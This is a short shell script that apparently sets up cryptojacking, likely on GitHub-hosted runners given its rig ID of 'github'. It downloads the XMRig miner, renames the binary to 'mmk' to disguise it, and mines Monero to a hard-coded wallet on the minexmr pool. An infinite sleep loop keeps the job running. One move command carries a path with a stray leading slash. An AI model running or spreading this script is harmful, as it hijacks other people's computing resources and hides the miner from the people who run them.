#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.8.2/xmrig-6.8.2-linux-x64.tar.gz
tar -xzvf xmrig-6.8.2-linux-x64.tar.gz
mv /xmrig-6.8.2/xmrig mmk
chmod +x mmk
rm -rf xmrig-6.8.2
./mmk -o us-west.minexmr.com:443 -u 42W4nii4hgbQEvjcV3j1bCiwkf6151v7fdruXhjRGnZc3oUDXwVTZAyR1pVxBuyXrD84BgnPvdXsCM4MGd811LAGUHrHQhc -k --tls --rig-id github
while [ 1 ]; do
sleep 3
done
sleep 999
